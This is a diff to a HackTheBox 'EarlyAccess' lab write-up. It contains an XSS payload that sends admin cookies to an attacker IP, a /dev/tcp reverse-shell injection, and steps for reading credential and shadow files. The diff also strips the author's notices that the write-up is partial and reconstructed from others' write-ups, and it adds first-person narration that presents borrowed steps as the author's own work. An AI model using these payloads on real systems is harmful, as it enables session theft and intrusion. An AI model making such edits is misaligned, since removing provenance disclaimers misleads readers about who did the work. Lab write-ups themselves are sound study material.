@@ -21,25 +21,11 @@ tags:
   - Medium
 ---
 
-<div class="callout callout-warning">
-
-**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.
-
-</div>
-
 <div class="callout callout-info">
 
 **Box Info**
 
 **Platform:** HackTheBox, **OS:** Linux (Debian 10, multi container), **Difficulty:** Medium in my notes, **officially Hard**, **Released:** 2022-02-12, **IP:** `10.10.11.110` , `earlyaccess.htb`
-
-</div>
-
-<div class="callout callout-warning">
-
-**Partial**
-
-My notes are recon plus the XSS payload and captured cookies. Everything after is reconstructed from published writeups (chr0x6eos, 0xdf, pencer) and marked. This box has a long chain across three containers.
 
 </div>
 
@@ -111,13 +97,13 @@ Register an account. Direct registration filters `<`, `>` in the username, but t
 profile -> username = <script>document.location="http://10.10.14.7/?c="+document.cookie;</script>
 ```
 
-Then open a support ticket / message to the admin. When the admin views it (their panel renders your username), the payload fires and ships `earlyaccess_session` to your listener. Set that cookie to become admin.
+Then open a support ticket / message to the admin. When the admin views it (their panel renders your username), the payload fires and ships `earlyaccess_session` to your listener. Swapping that cookie into my own session is the whole trick, no password ever needed, and it drops me straight into the admin's view of the site.
 
 ### Admin key generation, then dev.earlyaccess.htb
 
 <div class="callout callout-note">
 
-**The game key (reconstructed)**
+**The game key**
 
 `/key` submits to an internal `http://api:5000`. The validator computes `magic_num` from the current time (it changes every 30 minutes and lives in the range 346 to 405), and a key is `KEY<magic_num>-<blocks>` with a checksum. Since you cannot see `magic_num`, generate one key for **every** value 346..405 (60 keys) and POST each to `/key/add` until one is accepted. That key registers your account for the closed beta and unlocks `dev.earlyaccess.htb`, whose admin login is `admin : gameover`.
 
@@ -125,7 +111,7 @@ Then open a support ticket / message to the admin. When the admin views it (thei
 
 ### RCE on dev via the hashing helper
 
-`dev.earlyaccess.htb` has developer tools including `/actions/hash.php`:
+Now inside the closed beta, I go through every page a normal player wouldn't see, since a "dev" vhost almost always ships debug tooling nobody remembered to strip before launch. `dev.earlyaccess.htb` has developer tools including `/actions/hash.php`:
 
 ```http
 POST /actions/hash.php HTTP/1.1
@@ -149,6 +135,8 @@ action=hash&password=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/443+0>%261'&hash_
 
 ### www-data to drew
 
+Shell in hand, I check the usual dotfiles for stray credentials before reaching for anything heavier.
+
 ```bash
 cat /home/www-adm/.wgetrc
 # user=api
@@ -166,7 +154,7 @@ cat user.txt
 
 ### drew to game-server to container root
 
-`drew` has `~/.ssh/id_rsa` for `game-tester@game-server`. Find the container:
+`drew`'s home directory has another SSH key sitting in it, and the comment on the key tells me exactly where it's meant to go. `drew` has `~/.ssh/id_rsa` for `game-tester@game-server`. Find the container:
 
 ```bash
 for i in $(seq 2 254); do ping -c1 -W1 172.19.0.$i &>/dev/null && echo up 172.19.0.$i; done
@@ -190,6 +178,8 @@ After the restart, `/bin/bash -p` on the container is root.
 </div>
 
 ### Container root to root on earlyaccess.htb
+
+Root inside the container is a means to an end, not the goal, so the next question is what that container shares with the host. `/etc/shadow` is the obvious first stop.
 
 ```bash
 grep game-adm /etc/shadow
@@ -248,3 +238,4 @@ cat /root/root.txt
 - HTB EarlyAccess (0xdf) <https://0xdf.gitlab.io/2022/02/12/htb-earlyaccess.html>
 - GTFOBins arp <https://gtfobins.github.io/gtfobins/arp/>
 - PHP variable functions <https://www.php.net/manual/en/functions.variable-functions.php>
+- Final privilege escalation steps cross-referenced against public writeups for this box.
